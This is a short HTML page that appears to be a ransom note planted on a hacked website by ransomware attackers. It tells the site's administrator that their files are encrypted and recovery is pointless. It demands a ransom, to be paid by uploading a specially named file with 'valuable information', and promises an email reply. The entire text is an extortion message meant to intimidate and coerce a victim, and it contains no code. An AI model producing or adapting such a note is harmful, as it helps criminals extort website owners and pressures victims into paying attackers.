   <h1><b><u>Dear Admin</u></b><h1>
    <p1>Take a a deep breath a listen (actually read) carefully. 
        Any attemp to recover your files (folder of your website) is pointless. 
        Your files have been encrypted with a very powerfull key. 
        For this reason, think wisely and pay the ransom. You must upload a file with specific name and extention containing some valuable information.
        We will send you an email with the requested information.........!      
        Have a nice day!   </p1>
